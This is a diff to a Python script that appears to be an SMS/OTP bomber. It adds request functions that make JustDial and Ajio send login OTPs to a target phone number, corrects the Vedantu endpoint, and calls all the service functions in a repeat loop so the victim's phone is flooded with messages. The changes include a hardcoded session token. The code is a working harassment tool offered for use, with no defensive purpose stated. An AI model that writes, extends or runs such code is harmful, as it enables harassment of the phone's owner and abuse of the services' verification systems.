@@ -40,7 +40,6 @@ def flipkart_api():
 		print('Failed - Flipkart')
 
 
-
 def unacademy_api():
 	url = 'https://unacademy.com/api/v3/user/user_check/'
 
@@ -71,7 +70,6 @@ def unacademy_api():
 		print('Success - Unacademy')
 	else:
 		print('Failed - Unacademy')
-
 
 
 def grofers_api():
@@ -158,8 +156,9 @@ def swiggy_api():
 	else:
 		print('Failed - Swiggy')
 
+
 def vedantu_api():
-	url = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'
+	url = 'https://user.vedantu.com/user/preLoginVerification'
 
 	_headers = {
 		'Host': 'user.vedantu.com',
@@ -178,17 +177,75 @@ def vedantu_api():
 
 	requests = rq.post(url,headers=_headers,json=data)
 
-	if requests.json()['success'] == True:
+	if requests.json()['smsSent'] == True:
 		print('Success - Vedantu')
 	else:
 		print('Failed - Vedantu')
 
+
+def justdial_api():
+	url = 'https://www.justdial.com/functions/whatsappverification.php'
+
+	_headers = {
+	'Host': 'www.justdial.com',
+	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
+	'Accept': '*/*',
+	'Accept-Language': 'en-US,en;q=0.5',
+	'Accept-Encoding': 'gzip, deflate, br',
+	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	'X-FRSC-Token': '80e2947c12a2848808d20f0d959be0db55b1bf4572a9b099626a892675bd28af',
+	'X-Requested-With': 'XMLHttpRequest',
+	'Content-Length': '36',
+	'Origin': 'https://www.justdial.com',
+	'Connection': 'keep-alive',
+	'Referer': 'https://www.justdial.com/',
+	}
+
+
+	data = {
+		'mob':""+mobno
+	}
+
+	requests = rq.post(url,headers=_headers,data=data)
+
+	if requests.json()['sent'] == True:
+		print("Success - JustDial")
+	else:
+		print("Failed - JustDial - Rate Exceeded!")
+
+
+def ajio_api():
+	url = 'https://login.web.ajio.com/api/auth/generateLoginOTP'
+
+	_headers = {
+		'Host': 'login.web.ajio.com',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
+		'Accept': 'application/json',
+		'Accept-Language': 'en-US,en;q=0.5',
+		'Accept-Encoding': 'gzip, deflate, br',
+		'Content-Type': 'application/json',
+		'Content-Length': '29',
+		'Origin': 'https://www.ajio.com',
+		'Connection': 'keep-alive',
+		'Referer': 'https://www.ajio.com/',
+	}
+
+	data = {"mobileNumber":""+mobno}
+
+	requests = rq.post(url,headers=_headers,json=data)
+
+	if requests.status_code == 200:
+		print('Success - Ajio')
+	else:
+		print('Failed - Ajio')
 
 
 for x in range(0,quantity):
 	flipkart_api()
 	unacademy_api()
 	grofers_api()
+	justdial_api()
+	vedantu_api()
+	ajio_api()
 	confirmtkt_api()
 	swiggy_api()
-	vedantu_api()
